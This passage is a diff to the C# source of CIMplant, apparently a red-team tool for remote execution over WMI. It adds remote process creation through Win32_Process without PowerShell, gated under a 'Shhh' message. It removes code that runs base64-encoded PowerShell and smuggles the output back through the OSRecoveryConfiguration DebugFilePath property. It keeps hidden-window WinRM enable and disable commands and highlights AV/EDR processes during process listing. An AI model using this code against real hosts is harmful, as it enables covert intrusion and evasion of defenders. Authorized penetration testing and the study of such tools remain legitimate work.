+                Console.WriteLine("Shhh...Not using PS");
+
+                // Create the parameters and create the new process.
                 ObjectGetOptions options = new ObjectGetOptions();
                 ManagementPath pather = new ManagementPath("Win32_Process");
                 ManagementClass classInstance = new ManagementClass(scope, pather, options);
                 ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
 
-                string encodedCommand = "$data = (" + command +
-                                        " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+                inParams["CommandLine"] = command;
+                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
 
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-
-                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
-
-                if (noDebugCheck)
-                {
-                    // Method Options to set a timeout
-                    InvokeMethodOptions methodOptions = new InvokeMethodOptions(null, timeout);
-
-                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, methodOptions);
-                }
-                else
-                {
-                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-                }
+                Console.WriteLine(Convert.ToUInt32(outParams["ReturnValue"]) == 0
+                                ? "Successfully created process"
+                                : "Issues creating process");
             }
-
-            if (!noDebugCheck)
-            {
-                // Give it a second to write and check for changes to DebugFilePath
-                Thread.Sleep(5000);
-                CheckForFinishedDebugFilePath(originalWmiProperty, scope);
-
-
-                //Get the contents of the file in the DebugFilePath prop
-                string[] commandOutput = GetOsRecovery(scope).Split(',');
-                StringBuilder output = new StringBuilder();
-
-                //Print output.
-                foreach (string integer in commandOutput)
-                {
-                    try
-                    {
-                        char a = (char)Convert.ToInt32(integer);
-                        output.Append(a);
-                    }
-                    catch
-                    {
-                        //pass
-                    }
-                }
-
-                Console.WriteLine(output);
-            }
-            else
-                Console.WriteLine("New process spawned, not checking for output");
-
-            SetOsRecovery(scope, originalWmiProperty);
             return true;
         }
 
@@ -1026,38 +1287,52 @@ namespace CIMplant
         {
             ManagementScope scope = planter.Connector.ConnectedWmiSession;
 
-            ObjectGetOptions options = new ObjectGetOptions();
-            ManagementPath pather = new ManagementPath("Win32_Process");
-            ManagementClass classInstance = new ManagementClass(scope, pather, options);
-            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
-            inParams["CommandLine"] = "powershell -w hidden -command \"Disable-PSRemoting -Force\"";
+            if (!planter.Commander.NoPS)
+            {
+                ObjectGetOptions options = new ObjectGetOptions();
+                ManagementPath pather = new ManagementPath("Win32_Process");
+                ManagementClass classInstance = new ManagementClass(scope, pather, options);
+                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+                inParams["CommandLine"] = "powershell -w hidden -command \"Disable-PSRemoting -Force\"";
 
-            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-            
-            Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
-                ? "Successfully disabled WinRM"
-                : "Issues disabling WinRM");
+                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
 
-            return true;
+                Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
+                    ? "Successfully disabled WinRM"
+                    : "Issues disabling WinRM");
+                return true;
+            }
+            else
+            {
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
+                return null;
+            }
         }
 
         public object enable_winrm(Planter planter)
         {
             ManagementScope scope = planter.Connector.ConnectedWmiSession;
 
-            ObjectGetOptions options = new ObjectGetOptions();
-            ManagementPath pather = new ManagementPath("Win32_Process");
-            ManagementClass classInstance = new ManagementClass(scope, pather, options);
-            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
-            inParams["CommandLine"] = "powershell -w hidden -command \"Enable-PSRemoting -Force\"";
+            if (!planter.Commander.NoPS)
+            {
+                ObjectGetOptions options = new ObjectGetOptions();
+                ManagementPath pather = new ManagementPath("Win32_Process");
+                ManagementClass classInstance = new ManagementClass(scope, pather, options);
+                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+                inParams["CommandLine"] = "powershell -w hidden -command \"Enable-PSRemoting -Force\"";
 
-            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-            
-            Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
-                ? "Successfully enabled WinRM"
-                : "Issues enabling WinRM");
+                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
 
-            return true;
+                Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
+                    ? "Successfully enabled WinRM"
+                    : "Issues enabling WinRM");
+                return true;
+            }
+            else
+            {
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
+                return null;
+            }
         }
 
         public object registry_mod(Planter planter)
@@ -1632,24 +1907,56 @@ namespace CIMplant
             ManagementObjectSearcher fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
             ManagementObjectCollection queryCollection = fileSearcher.Get();
 
-            Console.WriteLine("{0,-35}{1,15}", "Name", "Handle");
-            Console.WriteLine("{0,-35}{1,15}", "-----------", "---------");
+            Console.WriteLine("{0,-50}{1,15}", "Name", "Handle");
+            Console.WriteLine("{0,-50}{1,15}", "-----------", "---------");
 
             foreach (var o in queryCollection)
             {
                 var wmiObject = (ManagementObject) o;
                 string name = (string)wmiObject["Name"];
-                if (name.Length > 30)
-                    name = Truncate(name, 30) + "...";
+                if (name.Length > 45)
+                    name = Truncate(name, 45) + "...";
                 try
                 {
-                    Console.WriteLine("{0,-35}{1,15}", name, wmiObject["Handle"]);
+                    if (Messenger.AVs.Any(name.ToLower().Equals))
+                    {
+                        // Make AV/EDR pop
+                        if (Console.BackgroundColor == ConsoleColor.Black)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("{0,-50}{1,15}", name, wmiObject["Handle"]);
+                            Console.ResetColor();
+                        }
+                    }
+                    else if (Messenger.Admin.Any(name.ToLower().Equals))
+                    {
+                        // Make admin tools pop
+                        if (Console.BackgroundColor == ConsoleColor.Black)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Cyan;
+                            Console.WriteLine("{0,-50}{1,15}", name, wmiObject["Handle"]);
+                            Console.ResetColor();
+                        }
+                    }
+                    else
+                        Console.WriteLine("{0,-50}{1,15}", name, wmiObject["Handle"]);
                 }
                 catch
                 {
                     //value probably doesn't exist, so just pass
                 }
             }
+
+            Messenger.BlueMessage("\nDenotes a potential admin tool");
+            Messenger.ErrorMessage("Denotes a potential AV/EDR product");
+
+
+
+
+
+
+
+
             return queryCollection;
         }
 
